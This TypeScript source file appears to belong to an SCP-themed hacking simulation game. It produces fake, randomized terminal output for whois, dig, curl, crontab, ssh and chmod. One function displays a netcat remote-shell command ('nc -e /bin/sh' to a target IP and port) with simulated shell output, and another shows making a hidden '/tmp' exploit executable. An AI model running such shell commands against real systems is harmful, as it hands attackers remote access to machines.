import type { ToolTemplateResult } from '../types'
import {
  randomInt,
  randomChoice,
  generateTimestamp,
  generateRandomHash,
  generateRandomIP,
  getToolDelay,
} from '../randomizer'

const R = '\x1b[0m'
const GREEN = '\x1b[32m'
const CYAN = '\x1b[36m'
const GRAY = '\x1b[90m'
const BOLD = '\x1b[1m'

export function generateWhoisOutput(targetIP: string): ToolTemplateResult {
  const lines: string[] = []

  lines.push('')
  lines.push(`% WHOIS query for ${targetIP}`)
  lines.push(`% Querying WHOIS server: whois.iana.org`)
  lines.push('')
  lines.push(
    `${BOLD}inetnum:${R}        ${targetIP.substring(0, targetIP.lastIndexOf('.'))}.0 - ${targetIP.substring(0, targetIP.lastIndexOf('.'))}.255`
  )
  lines.push(`${BOLD}netname:${R}        SCP-FOUNDATION-NET`)
  lines.push(`${BOLD}descr:${R}          SCP Foundation Secure Network`)
  lines.push(`${BOLD}descr:${R}          Classified Infrastructure Division`)
  lines.push(`${BOLD}country:${R}        US`)
  lines.push(`${BOLD}org-name:${R}       SCP Foundation`)
  lines.push(`${BOLD}org-type:${R}       LIR`)
  lines.push(`${BOLD}address:${R}        Site-17, [REDACTED]`)
  lines.push(`${BOLD}admin-c:${R}        O5-1`)
  lines.push(`${BOLD}tech-c:${R}         TECH-${randomInt(100, 999)}`)
  lines.push(`${BOLD}mnt-by:${R}         SCP-MNT`)
  lines.push(
    `${BOLD}created:${R}        200${randomInt(5, 9)}-${randomInt(1, 12).toString().padStart(2, '0')}-${randomInt(1, 28).toString().padStart(2, '0')}`
  )
  lines.push(
    `${BOLD}last-modified:${R}  2024-${randomInt(1, 12).toString().padStart(2, '0')}-${randomInt(1, 28).toString().padStart(2, '0')}`
  )
  lines.push(`${BOLD}source:${R}         ARIN`)
  lines.push('')
  lines.push(`${BOLD}route:${R}          ${targetIP.substring(0, targetIP.lastIndexOf('.'))}.0/24`)
  lines.push(`${BOLD}origin:${R}         AS${randomInt(10000, 65535)}`)
  lines.push(`${BOLD}mnt-by:${R}         SCP-ROUTE-MNT`)
  lines.push('')
  lines.push(`% This query was served by the ARIN WHOIS Service`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('whois'),
  }
}

export function generateDigOutput(hostname: string): ToolTemplateResult {
  const lines: string[] = []
  const ip = generateRandomIP()

  lines.push('')
  lines.push(`; <<>> DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu <<>> ${hostname} ANY`)
  lines.push(`;; global options: +cmd`)
  lines.push(`;; Got answer:`)
  lines.push(`;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: ${randomInt(10000, 65535)}`)
  lines.push(`;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 1`)
  lines.push('')
  lines.push(`;; QUESTION SECTION:`)
  lines.push(`;${hostname}.            IN      ANY`)
  lines.push('')
  lines.push(`;; ANSWER SECTION:`)
  lines.push(`${hostname}.     ${randomInt(300, 3600)}   IN      A       ${ip}`)
  lines.push(
    `${hostname}.     ${randomInt(300, 3600)}   IN      AAAA    2001:db8::${generateRandomHash(4)}`
  )
  lines.push(`${hostname}.     ${randomInt(300, 3600)}   IN      MX      10 mail.${hostname}.`)
  lines.push(`${hostname}.     ${randomInt(300, 3600)}   IN      NS      ns1.${hostname}.`)
  lines.push(`${hostname}.     ${randomInt(300, 3600)}   IN      NS      ns2.${hostname}.`)
  lines.push(
    `${hostname}.     ${randomInt(300, 3600)}   IN      TXT     "v=spf1 include:_spf.${hostname} ~all"`
  )
  lines.push('')
  lines.push(`;; ADDITIONAL SECTION:`)
  lines.push(`ns1.${hostname}.  ${randomInt(300, 3600)}   IN      A       ${generateRandomIP()}`)
  lines.push('')
  lines.push(`;; Query time: ${randomInt(1, 50)} msec`)
  lines.push(`;; SERVER: ${generateRandomIP()}#53`)
  lines.push(`;; WHEN: ${generateTimestamp()}`)
  lines.push(`;; MSG SIZE  rcvd: ${randomInt(180, 350)}`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('dig'),
  }
}

export function generateNetcatShell(targetIP: string, port: number): ToolTemplateResult {
  const lines: string[] = []

  lines.push('')
  lines.push(`${GRAY}$${R} nc -e /bin/sh ${targetIP} ${port}`)
  lines.push(`${GREEN}[+]${R} Connection established to ${targetIP}:${port}`)
  lines.push(`${GREEN}[+]${R} Shell spawned on remote host`)
  lines.push('')
  lines.push(`${CYAN}whoami${R}`)
  lines.push(`${GREEN}www-data${R}`)
  lines.push('')
  lines.push(`${CYAN}id${R}`)
  lines.push(`uid=33(www-data) gid=33(www-data) groups=33(www-data)`)
  lines.push('')
  lines.push(`${CYAN}hostname${R}`)
  lines.push(`scp-web-${randomInt(1, 99)}`)
  lines.push('')
  lines.push(`${CYAN}uname -a${R}`)
  lines.push(`Linux scp-web-${randomInt(1, 99)} 5.15.0-58-generic #64-Ubuntu SMP x86_64 GNU/Linux`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('netcat'),
    variables: {
      currentAccess: 'user',
    },
  }
}

export function generateCurlOutput(url: string): ToolTemplateResult {
  const lines: string[] = []
  const serverVersion = randomChoice([
    'Apache/2.4.52 (Ubuntu)',
    'nginx/1.24.0',
    'Apache/2.4.54 (Debian)',
  ])
  const statusCode = randomChoice([200, 200, 200, 301, 403, 404])

  lines.push('')
  lines.push(`${GRAY}$${R} curl -I ${url}`)
  lines.push(
    `HTTP/1.1 ${statusCode} ${statusCode === 200 ? 'OK' : statusCode === 301 ? 'Moved Permanently' : statusCode === 403 ? 'Forbidden' : 'Not Found'}`
  )
  lines.push(`Date: ${new Date().toUTCString()}`)
  lines.push(`Server: ${serverVersion}`)
  lines.push(`X-Powered-By: ${randomChoice(['PHP/8.1.13', 'Express', 'Next.js'])}`)
  lines.push(`Content-Type: text/html; charset=UTF-8`)
  lines.push(`Connection: keep-alive`)
  lines.push(
    `Set-Cookie: ${randomChoice(['PHPSESSID', 'sessionid', '_sid'])}=${generateRandomHash(26)}; path=/; HttpOnly`
  )
  lines.push(`X-Frame-Options: SAMEORIGIN`)
  lines.push(`X-Content-Type-Options: nosniff`)
  lines.push(`Content-Length: ${randomInt(1000, 50000)}`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('curl'),
  }
}

export function generateCrontabOutput(): ToolTemplateResult {
  const lines: string[] = []

  lines.push('')
  lines.push(`${GRAY}$${R} crontab -l`)
  lines.push(`# m h  dom mon dow   command`)
  lines.push(`*/5 * * * *   /usr/local/bin/health-check.sh`)
  lines.push(`0 2 * * *     /opt/backup/rotate-logs.sh`)
  lines.push(`0 3 * * 0     /opt/backup/full-backup.sh`)
  lines.push(`*/10 * * * *  /usr/local/bin/monitor-services.sh`)
  lines.push(`30 4 * * *    /opt/scp/sync-containment-data.sh`)
  lines.push(`0 0 1 * *     /opt/scp/monthly-audit.sh`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('default'),
  }
}

export function generateChmodOutput(): ToolTemplateResult {
  const lines: string[] = []

  lines.push('')
  lines.push(`${GRAY}$${R} chmod +x /tmp/.scp_${generateRandomHash(6)}/exploit`)
  lines.push(`${GREEN}[+]${R} Permissions updated successfully`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('default'),
  }
}

export function generateSshConnect(user: string, host: string): ToolTemplateResult {
  const lines: string[] = []

  lines.push('')
  lines.push(`${GRAY}$${R} ssh ${user}@${host}`)
  lines.push(`The authenticity of host '${host} (${generateRandomIP()})' can't be established.`)
  lines.push(`ED25519 key fingerprint is SHA256:${generateRandomHash(43)}.`)
  lines.push(`Are you sure you want to continue connecting (yes/no)? yes`)
  lines.push(`Warning: Permanently added '${host}' (ED25519) to the list of known hosts.`)
  lines.push(`${GREEN}${user}@${host}${R}'s password: ********`)
  lines.push(`Last login: ${generateTimestamp()} from ${generateRandomIP()}`)
  lines.push(`${GREEN}[+]${R} SSH session established: ${user}@${host}`)
  lines.push('')

  return {
    lines,
    delay: getToolDelay('default'),
    variables: {
      currentAccess: 'user',
    },
  }
}
